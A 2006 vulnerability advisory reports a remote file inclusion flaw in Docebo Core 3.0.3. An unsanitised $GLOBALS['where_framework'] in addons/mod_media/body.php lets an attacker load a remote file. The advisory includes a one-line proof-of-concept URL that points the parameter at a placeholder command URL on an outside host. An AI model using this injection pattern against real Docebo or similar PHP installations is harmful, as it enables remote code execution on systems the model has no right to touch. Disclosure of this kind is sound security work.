Advisory id: FSA:008
Author: Federico Fazzi
Date: 09/06/2006, 6:44
Sinthesis: Docebo Core 3.0.3, Remote command execution
Type: high
Product: http://www.docebolms.org/
Patch: unavailable
-----------------------------------------------------
1) Description:
Error occured in body.php,
include\_once($GLOBALS['where\_framework']."/lib/lib.upload.php");
The users can include a remote file because
the $GLOBALS['where\_framework'] isn't sanitized
2) Proof of concept:
http://example/[dc\_path]/addons/mod\_media/body.php?GLOBALS[where\_framework]=[cmd\_url]
3) Solution:
include file where are declare $GLOBALS[\*]
